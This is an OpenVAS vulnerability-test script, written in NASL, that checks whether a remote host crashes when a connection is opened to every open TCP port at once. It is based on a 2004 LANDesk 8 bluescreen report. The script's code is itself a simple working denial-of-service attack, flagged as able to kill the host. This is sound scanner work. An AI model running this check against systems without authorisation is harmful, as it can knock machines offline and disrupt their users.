###############################################################################
# OpenVAS Vulnerability Test
# $Id: open_all_ports_DoS.nasl 8145 2017-12-15 13:31:58Z cfischer $
#
# connect to all open ports
#
# Authors:
# Michel Arboi <mikhail@nessus.org>
#
# Copyright:
# Copyright (C) 2004 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# References:
# From: Ryan Rounkles <ryan.rounkles@gmail.com>
# To: vuln-dev@securityfocus.com
# Date: Tue, 19 Oct 2004 09:39:46 -0700
# Subject: Denial of service in LANDesk 8

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15571");
  script_version("$Revision: 8145 $");
  script_tag(name:"last_modification", value:"$Date: 2017-12-15 14:31:58 +0100 (Fri, 15 Dec 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("connect to all open ports");
  script_category(ACT_KILL_HOST);
  script_copyright("This script is Copyright (C) 2004 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("secpod_open_tcp_ports.nasl");
  script_mandatory_keys("TCP/PORTS");

  # script_require_ports("Services/msrdp", 3389);
  # The original advisory says that we can crash the machine by connecting to
  # LANDesk8 (which port is it?) and RDP simultaneously.
  # I modified the attack, just in case

  tag_summary = "It was possible to crash the remote system by connecting
  to every open port.
  This is known to bluescreen machines running LANDesk8
  (In this case, connecting to two ports is enough)";

  tag_solution = "inform your software vendor(s) and patch your system";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");

start_denial();

i = 0;

ports = get_all_tcp_ports_list();
if( isnull( ports ) ) exit( 0 );

foreach port( ports ) {
  s[i] = open_sock_tcp( port );
  if( s[i] ) i++;
}


if( i == 0 ) exit( 0 );

alive = end_denial();

if( ! alive ) {
  security_message( port:0 );
  # set_kb_item( name:"Host/dead", value:TRUE ); #TBD remove?
  exit( 0 );
}

for( j = 0; j < i; j ++ ) {
  close( s[j] );
}

exit( 99 );